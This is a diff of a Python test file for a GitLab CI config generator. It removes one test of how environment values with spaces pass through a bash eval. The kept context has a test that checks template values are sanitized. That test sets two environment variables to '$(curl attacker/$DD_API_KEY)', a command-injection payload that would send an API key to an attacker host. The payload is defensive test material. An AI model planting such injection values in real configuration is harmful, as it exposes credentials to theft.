@@ -151,29 +151,6 @@ def test_ddtest_uv_jobs_preserve_the_suite_command(gen_gitlab_config_mod):
     assert "DDTEST_UV_ENV_uv123: PYTHONOPTIMIZE=1" in content
 
 
-def test_ddtest_uv_jobs_preserve_environment_values_with_spaces(gen_gitlab_config_mod):
-    payload = gen_gitlab_config_mod._shell_environment(
-        {
-            "DDTEST_PYTEST_ADDOPTS": "-vv --ignore-glob='*civisibility*'",
-            "DDTEST_SUITE_PATH": "tests/integration",
-        }
-    )
-    result = gen_gitlab_config_mod.subprocess.run(
-        [
-            "bash",
-            "-c",
-            'env_var=DDTEST_ENV; eval "export ${!env_var}"; printf "%s" "$DDTEST_PYTEST_ADDOPTS"',
-        ],
-        check=True,
-        capture_output=True,
-        env={"DDTEST_ENV": payload},
-        text=True,
-    )
-
-    assert result.stdout == "-vv --ignore-glob='*civisibility*'"
-    assert (gen_gitlab_config_mod.GITLAB / "tests.yml").read_text().count('eval "export ${!env_var}"') == 2
-
-
 def test_build_base_venvs_template_gets_sanitized_bool_values(gen_gitlab_config_mod, monkeypatch, tmp_path):
     monkeypatch.setenv("NIGHTLY_BUILD", "$(curl attacker/$DD_API_KEY)")
     monkeypatch.setenv("UNPIN_DEPENDENCIES", "$(curl attacker/$DD_API_KEY)")
